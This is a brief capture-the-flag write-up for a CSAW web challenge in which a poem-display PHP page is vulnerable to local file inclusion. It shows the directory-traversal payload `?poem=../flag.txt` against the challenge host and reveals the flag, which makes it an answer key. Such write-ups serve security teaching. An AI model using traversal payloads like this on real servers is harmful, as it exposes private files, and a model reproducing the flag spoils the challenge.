#### Challenge:

Hey! I made a cool website that shows off my favorite poems. See if you can find `flag.txt` somewhere!

[http://web.chal.csaw.io:5003](http://web.chal.csaw.io:5003)

---

#### Solution:

Opening the site it gives us a link to another site - [http://web.chal.csaw.io:5003/poems](http://web.chal.csaw.io:5003/poems).
Following that throws `PHP` error - `file_get_contents(): Filename cannot be empty in ...` and three links to:

[http://web.chal.csaw.io:5003/poems/?poem=poem1.txt](http://web.chal.csaw.io:5003/poems?poem=poem1.txt)

[http://web.chal.csaw.io:5003/poems/?poem=poem2.txt](http://web.chal.csaw.io:5003/poems?poem=poem2.txt)

[http://web.chal.csaw.io:5003/poems/?poem=poem3.txt](http://web.chal.csaw.io:5003/poems?poem=poem3.txt)


From that, it is easy to figgure out that its `Local File Inclusion (LFI)`. After few try's we found the flag at:

[http://web.chal.csaw.io:5003/poems/?poem=../flag.txt](http://web.chal.csaw.io:5003/poems/?poem=../flag.txt)

---

<details><summary>FLAG:</summary>

```
flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}
```

</details>
<br/>
